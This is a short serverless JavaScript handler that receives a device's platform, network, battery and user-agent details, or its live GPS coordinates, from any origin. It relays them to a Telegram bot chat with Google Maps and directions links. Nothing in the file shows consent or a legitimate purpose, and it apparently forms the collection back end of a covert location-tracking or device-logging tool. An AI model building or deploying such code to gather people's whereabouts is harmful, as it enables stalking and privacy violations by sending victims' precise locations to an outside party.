export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json(false);
  }

  const body = req.body;
  const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!TELEGRAM_TOKEN || !CHAT_ID) {
    return res.status(500).json(false);
  }

  let message = "";

  if (body.platform && body.connection && body.userAgent) {
    message = `
📱 *Device Info*
🧭 Platform: ${body.platform}
🌐 Network: ${body.connection}
🔋 Battery: ${body.battery || "N/A"}
🧾 User Agent:
${body.userAgent}`;
  } else if (
    typeof body.lat === "number" &&
    typeof body.lng === "number" &&
    typeof body.accuracy === "number"
  ) {
    message = `
📍 *Live Location Update*
*Latitude:* \`${body.lat}\`
*Longitude:* \`${body.lng}\`
*Accuracy:* ~${Math.round(body.accuracy)} meters

🌍 [View on Map](https://www.google.com/maps/search/?api=1&query=${body.lat},${
      body.lng
    })
🧭 [Get Directions](https://www.google.com/maps/dir/?api=1&destination=${
      body.lat
    },${body.lng})`;
  } else {
    return res.status(400).json(false);
  }

  try {
    const resp = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown",
          disable_web_page_preview: false,
        }),
      }
    );

    const data = await resp.json();
    if (!data.ok) throw new Error(data.description);

    return res.status(200).json(true);
  } catch (err) {
    return res.status(500).json(false);
  }
}
